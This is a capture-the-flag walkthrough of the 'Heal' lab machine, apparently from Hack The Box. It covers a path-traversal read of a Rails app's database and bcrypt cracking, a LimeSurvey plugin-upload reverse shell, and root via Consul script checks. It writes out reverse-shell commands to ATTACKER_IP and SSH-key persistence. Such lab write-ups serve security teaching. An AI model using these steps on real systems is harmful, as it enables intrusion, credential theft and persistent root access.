Ruby on Rails resume-builder application leaking files through the PDF-export download endpoint, used to read `config/database.yml` and then the SQLite database itself, dumping a bcrypt hash that cracks to the LimeSurvey admin password. Authenticated LimeSurvey RCE via malicious plugin upload (Y1LD1R1M PoC) lands a shell as `www-data`; the LimeSurvey `config.php` discloses a database password reused by the OS user `ron`. Privilege escalation via a HashiCorp Consul instance running as root with `enable_script_checks=true` and `acl_default_policy=allow` — the agent's `/v1/agent/check/register` API accepts unauthenticated registration of script-based health checks, which Consul then executes as root.

## Reconnaissance & Enumeration

The objective of this phase was to enumerate exposed services, identify the application stack, and map the relationships between the multiple vhosts that turned out to be in play.

### Port Scan

A single combined Nmap scan covered every TCP port with default scripts and version detection:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.129.242.228 -oA nmap.out
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
```

Two ports — SSH and HTTP — with the HTTP server returning a redirect to `heal.htb`. SSH was deprioritised (the version is current and there were no credentials). The domain was added to `/etc/hosts`:

```bash
echo "10.129.242.228 heal.htb" | sudo tee -a /etc/hosts
```

### Web Application — Fast Resume Builder

Browsing to `http://heal.htb/` loaded a single-page application (SPA) called "Fast Resume Builder" with a login form and a sign-up option. Attempting to create an account returned a frontend error message but no obvious indication of what went wrong on the wire. Intercepting the sign-up request in Burp Suite was the obvious next move and immediately revealed something useful:

```http
POST /signup HTTP/1.1
Host: api.heal.htb
Content-Type: application/json

{"username":"...","password":"..."}
```

The SPA was making cross-origin requests to a second vhost — **`api.heal.htb`** — that the browser couldn't resolve because it wasn't in `/etc/hosts`. SPAs commonly split a frontend on one vhost from a backend API on another, and the fact that the JavaScript bundle was hardcoded to a name-based host (rather than a path on the same origin) is the disclosure that turned this into a multi-vhost engagement.

```bash
echo "10.129.242.228 api.heal.htb" | sudo tee -a /etc/hosts
```

Sign-up succeeded the second time around, and the logged-in interface presented three features: a resume builder with an "Export as PDF" button, a profile view (with a user-ID indicating I was the second registered user), and a "Survey" link. Clicking "Take the Survey" navigated to yet another vhost — **`take-survey.heal.htb`** — added to hosts as well:

```bash
echo "10.129.242.228 take-survey.heal.htb" | sudo tee -a /etc/hosts
```

### `take-survey.heal.htb` — LimeSurvey

The survey itself was a single-question form that thanked the user and redirected nowhere interesting. The URL, however, looked like a CMS endpoint: `/index.php/552933?lang=en`. Stripping the path and visiting the vhost root loaded a recognisable interface:

```text
LimeSurvey - the free and open source survey software
[...]
Contact: ralph@heal.htb
```

Two findings at once: the product is **LimeSurvey**, and there's an admin contact email — **`ralph@heal.htb`** — that hints at a system user named `ralph`. A quick Exploit-DB search returned a LimeSurvey RCE PoC, but the exploit required prior authentication to the admin panel. Visiting `/admin` redirected to `/index.php/admin/authentication/sa/login` — a standard LimeSurvey admin login. Without credentials, this was a dead end for the moment.

Trying to discover hidden paths with `feroxbuster` failed loudly: the server returned 503s for nearly every request, indicating a rate limiter or spider trap configured in front of the application. Pivoting back to the resume builder was less risky than fighting the WAF.

## Discovering the LFI

### Watching the PDF Export Flow

Server-Side Template Injection was the first thing to test against the resume fields — pasting `{{5*5}}` and similar Jinja-style payloads — but nothing reflected. The "Export as PDF" button was more interesting because it had to do something on the server: render a PDF, store it somewhere, return it to the browser. Capturing the full flow in Burp:

```http
POST /exports HTTP/1.1
Host: api.heal.htb
Content-Type: application/json

{ ... resume data ... }
```

The response contained a filename. The browser then issued:

```http
OPTIONS /export?file=resume_xxx.pdf HTTP/1.1
Host: api.heal.htb
Access-Control-Request-Method: GET

GET /export?file=resume_xxx.pdf HTTP/1.1
Host: api.heal.htb
```

The OPTIONS preflight is a CORS dance to confirm the browser is allowed to issue the GET; the GET itself is where the file actually comes down. The `file=` parameter being a literal filename — rather than an opaque ID — is the same red flag as in many directory-traversal bugs. The server interpolates the parameter into a filesystem path, and if it doesn't sanitise `../` sequences, anything readable by the application user is reachable.

Sending the GET to Repeater and swapping the parameter to `../../../../../../etc/passwd` confirmed the bug:

```http
GET /export?file=../../../../../../etc/passwd HTTP/1.1
Host: api.heal.htb

HTTP/1.1 200 OK
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
[...]
ralph:x:1000:1000:,,,:/home/ralph:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

Two interesting users with login shells: `ralph` and `ron`. The traversal sink works; the question was now *what* to read.

### Identifying the API Stack

A bare `curl` against the API root disclosed the backend framework:

```bash
curl http://api.heal.htb
<!DOCTYPE html>
<html>
<head>
  <title>Ruby on Rails 7.1.4</title>
[...]
```

**Ruby on Rails 7.1.4**. Rails has a fixed and well-documented project layout, which means a directory traversal against a Rails app is far more productive than the same primitive against a custom application — the attacker knows exactly where to look. Two paths matter immediately:

- **`config/database.yml`** — the database connection configuration, including credentials.
- **`storage/`** — Active Storage's default location for SQLite databases in development mode.

## Exploitation

### Reading `database.yml`

```bash
curl -s "http://api.heal.htb/export?file=../../../../../config/database.yml"
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

production:
  <<: *default
  database: storage/development.sqlite3
```

Two things to note. The configuration uses **SQLite**, not a network database — which means the entire user table is in a single file readable through the same LFI. And the `production` block's `database:` entry points at **`storage/development.sqlite3`** — production is pointing at the development database, presumably a deployment shortcut that left a sloppy fingerprint.

### Dumping the User Table

The SQLite file came down as a binary blob through the LFI:

```bash
curl -s "http://api.heal.htb/export?file=../../../../../storage/development.sqlite3" -o development.sqlite3
file development.sqlite3
development.sqlite3: SQLite 3.x database
```

Querying the `users` table directly:

```bash
sqlite3 development.sqlite3 "SELECT email, password_digest FROM users;"
ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
```

The `$2a$12$` prefix identifies it as **bcrypt** with cost factor 12. Hashcat mode 3200 covers this exactly.

### Cracking the bcrypt Hash

bcrypt's cost factor 12 means 2^12 = 4096 key-derivation iterations per attempt — slow by design, but still tractable against a wordlist that contains the actual password. The original write-up's benchmark of ~25 H/s on an i7-13700K is in the expected ballpark for bcrypt 12 on CPU; what matters is whether the candidate is in rockyou, not how fast the cracker is:

```bash
echo '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG' > ralph.hash
hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt
[...]
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:<REDACTED>
Status...........: Cracked
Speed.#1.........: 25 H/s
Recovered........: 1/1 (100.00%) Digests
```

Hash cracked. The natural reflex was to test the credential against SSH first:

```bash
ssh ralph@heal.htb
ralph@heal.htb's password: <REDACTED>
Permission denied, please try again.
```

SSH rejected it — but the credential was for a **LimeSurvey admin** account, not the OS user. Testing the password against the LimeSurvey admin login at `/index.php/admin/authentication/sa/login`:

> Welcome back, ralph

Authenticated as the LimeSurvey administrator. The bcrypt was a Rails-managed application credential for the resume-builder app; `ralph` had reused it for his LimeSurvey admin account. This is the first of two credential reuses on this box.

### LimeSurvey RCE via Plugin Upload

The footer of the LimeSurvey admin panel disclosed the version — somewhere in the 6.x range. The Exploit-DB PoC found earlier targeted 5.2.4, but the technique is the same across the 3.x–7.x range because the underlying primitive (admin can upload arbitrary plugin code) hasn't structurally changed.

The PoC by **Y1LD1R1M** (`Limesurvey-RCE` on GitHub) packages a `config.xml` and a PHP file into a zip, then uploads it through `Configuration → Plugins → Upload & install`. LimeSurvey extracts the zip into `upload/plugins/<plugin-name>/`, and the extracted PHP file is reachable from the web at the predictable URL. The PHP runs under `www-data` because that's the Apache user.

The PoC's `config.xml` describes plugin metadata; the only edit needed is adding the running LimeSurvey major version (6.0 and 7.0 for safety) to the `<compatibility>` block, otherwise LimeSurvey rejects the install:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>Y1LD1R1M</name>
        <type>plugin</type>
        [...]
    </metadata>
    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>
        <version>7.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

The PHP file is the reverse-shell script from `pentestmonkey` shipped with the PoC, with the IP and port adjusted:

```php
<?php
set_time_limit(0);
$ip   = '<ATTACKER_IP>';
$port = 443;
[...]
```

Both files were zipped together:

```bash
zip plugin.zip config.xml php-rev.php
  adding: config.xml (deflated 57%)
  adding: php-rev.php (deflated 61%)
```

The listener was started:

```bash
sudo nc -lvnp 443
listening on [any] 443 ...
```

The zip was uploaded via the admin UI (`Configuration → Plugins → Upload & install`), and then the PHP file was triggered directly:

```bash
curl http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php
# (no output; the callback fires on the listener)
```

The listener caught the connection as **`www-data`**. A janitor cron on the box deletes uploaded plugins after about a minute, so the trigger needs to happen quickly — not a long-term hosting solution, just enough time to land the shell. A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made it usable.

## Foothold & Lateral Movement — `www-data` → `ron`

The first thing worth grepping for from a `www-data` shell is application configuration files containing credentials. LimeSurvey's main config lives at `limesurvey/application/config/config.php`:

```bash
cat /var/www/limesurvey/application/config/config.php
'connectionString' => 'mysql:host=localhost;port=3306;dbname=limesurvey',
'username' => 'ralph',
'password' => '<NEW_REDACTED>',
[...]
```

A second password — distinct from the bcrypt-cracked one — used for LimeSurvey's MySQL connection. Trying it as a system password for `ralph` failed:

```bash
ssh ralph@heal.htb
ralph@heal.htb's password: <NEW_REDACTED>
Permission denied, please try again.
```

But the same string worked against the second user enumerated earlier — `ron`:

```bash
ssh ron@heal.htb
ron@heal.htb's password: <NEW_REDACTED>
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
ron@heal:~$ cat user.txt
```

This is the **second** credential reuse on this box. The MySQL DB password used by a LimeSurvey instance that `ralph` administers turned out to be the OS password of an entirely different user. The lesson — passwords get shared across services in ways their owners frequently forget — is the same.

## Privilege Escalation — `ron` → `root`

### Discovering Consul

With a shell as `ron`, the usual checks. `sudo -l` returned nothing useful, but `ps aux` had an interesting root-owned process:

```bash
ps aux | grep -v grep | grep -E "root|consul"
root  1927  /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
```

**HashiCorp Consul** is a service-networking platform — service discovery, health checks, key-value config storage, service mesh. The "as root" part is the relevant detail: anything an attacker can convince Consul to execute on their behalf will run with root privileges.

### Reading the Consul Configuration

`/etc/consul.d` was the `-config-dir` flag's target:

```bash
cat /etc/consul.d/config.json
{
  "bootstrap": true,
  "server": true,
  "enable_syslog": true,
  "enable_script_checks": true,
  "datacenter": "server1",
  "addresses": { "http": "127.0.0.1" },
  "bind_addr": "127.0.0.1",
  "node_name": "heal-internal",
  "data_dir": "/var/lib/consul",
  "acl_datacenter": "heal-server",
  "acl_default_policy": "allow",
  "encrypt": "l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ="
}
```

Two settings are individually risky and catastrophic in combination:

- **`"enable_script_checks": true`** — Consul supports two kinds of health checks: HTTP (poll a URL) and **script** (execute a command and check its exit code). Script checks were disabled by default in modern Consul precisely because they're remote code execution by design. Enabling them turns the agent's check-registration API into an RCE primitive for any caller who can reach it.
- **`"acl_default_policy": "allow"`** — Consul's ACL system defaults to allow when no token is presented. Combined with the previous flag, this means **unauthenticated callers can register script checks**.

The HTTP API listening on `127.0.0.1:8500` (the default) accepts `PUT /v1/agent/check/register` to add a new check on the local agent. With script checks enabled and no ACL enforcement, the body of that PUT becomes an arbitrary command to execute as root.

### Confirming the RCE Blind

Before testing a reverse shell, a blind ICMP confirmation isolates the question "does my command actually run" from the question "can my reverse shell get through". A `tcpdump` listener on the attacker's `tun0` interface filters for ICMP:

```bash
sudo tcpdump -i tun0 icmp
```

And on the target, the malicious check registration:

```bash
curl -X PUT http://127.0.0.1:8500/v1/agent/check/register \
  -d '{"Name": "deadly_check", "Args": ["/bin/bash", "-c", "ping -c 5 <ATTACKER_IP>"], "Interval": "10s"}'
```

The check fires every 10 seconds. Within seconds, `tcpdump` showed inbound ICMP echo requests from the target:

```text
11:23:01.234 IP heal.htb > <ATTACKER_IP>: ICMP echo request
```

RCE confirmed. The command runs as root because Consul itself runs as root, and the script-check executor inherits its parent's privileges directly.

### Reverse Shell with Persistence

Upgrading to a reverse shell required replacing the ping with a payload that calls back to a listener. The catch is the **`Interval: 10s`** field — the script runs every ten seconds, which means whatever reverse shell it spawns gets killed and re-spawned on that cadence. Useful for one-shot commands; useless for interactive work.

The cleanest fix is to use the first invocation to drop a persistent backdoor (an SSH public key into `/root/.ssh/authorized_keys`) rather than maintaining a live shell. The attacker generates a fresh keypair locally:

```bash
ssh-keygen -t rsa -f persist -N ""
Your identification has been saved in persist
Your public key has been saved in persist.pub
```

Then registers a one-shot reverse shell to a listener:

```bash
sudo nc -lvnp 443
listening on [any] 443 ...
```

```bash
curl -X PUT http://127.0.0.1:8500/v1/agent/check/register \
  -d '{"Name": "deadly_check2", "Args": ["/bin/bash", "-c", "busybox nc <ATTACKER_IP> 443 -e /bin/bash"], "Interval": "10s"}'
```

`busybox nc` is used instead of plain `nc` because Ubuntu ships the OpenBSD variant which doesn't include `-e`. The listener caught root within ten seconds:

```text
connect to [<ATTACKER_IP>] from (UNKNOWN) [10.129.242.228] 41082
id
uid=0(root) gid=0(root) groups=0(root)
```

Inside that ten-second window, the persistent key was dropped:

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD..." >> /root/.ssh/authorized_keys
```

The shell died on schedule, but the authorized_keys entry was now permanent. Connecting back over SSH was the stable replacement:

```bash
ssh -i persist root@heal.htb
Welcome to Ubuntu 22.04.5 LTS
root@heal:~# cat root.txt
```

## Key Takeaways

- **SPAs that hardcode API hostnames give away the architecture for free.** A frontend on `app.example.com` fetching from `api.example.com` is documenting the full attack surface in plain JavaScript. Any engagement against an SPA should start by intercepting one real request in Burp and reading the Host header on the response — half the time, there's a second vhost no DNS-bruteforce wordlist would have found.
- **Framework identification dictates LFI productivity.** A directory traversal against an unknown application yields whatever files the attacker can guess at. The same traversal against a Ruby on Rails app yields `config/database.yml`, `storage/`, `config/master.key`, `Gemfile.lock`, and the entire fixed project layout that the framework imposes. Always identify the backend stack before deciding what to read.
- **Production pointing at the development database is a real anti-pattern.** Rails' default `database.yml` separates `development`, `test`, and `production` for a reason — production should never be reading a development SQLite file. When it does, every credential ever inserted during development testing is now production data.
- **Bcrypt cost 12 is not slow enough to defend a password in rockyou.** 25 hashes/sec on a single-CPU cracker is theoretically slow, but rockyou's top entries fall in a handful of attempts regardless of cost factor. PBKDF and bcrypt cost are a defence against *guessing the entropy of a strong password*, not against guessing a common password — that requires a password policy and breach-list filtering, both at password-set time.
- **Application admin passwords and OS passwords share an operator.** Two credential reuses on the same box, both following the same pattern: an application credential found in one tier (Rails-managed bcrypt; LimeSurvey MySQL config) works for an OS account at a different tier. The first instinct after recovering any credential should be to test it against SSH for *every* known username, not just the obvious match.
- **`enable_script_checks` is the Consul equivalent of `eval()` over HTTP.** Any service that documents an option to "run a command and check its exit code" is offering RCE as a feature, and the corresponding hardening discipline is to assume the option is enabled unless explicitly verified disabled. Combined with `acl_default_policy: allow`, it produces an unauthenticated RCE primitive against root over a localhost socket — which is exactly the kind of internal service that lateral-moved attackers reach.
- **For RCE primitives with short intervals, persistence beats interactivity.** A reverse shell that dies every ten seconds is barely usable for exploring a system; a public key dropped into `/root/.ssh/authorized_keys` during the first ten-second window converts an unstable RCE into a stable SSH login. The general pattern — first execution drops persistence, all subsequent work uses the persistence — applies to any time-bounded code-execution channel.
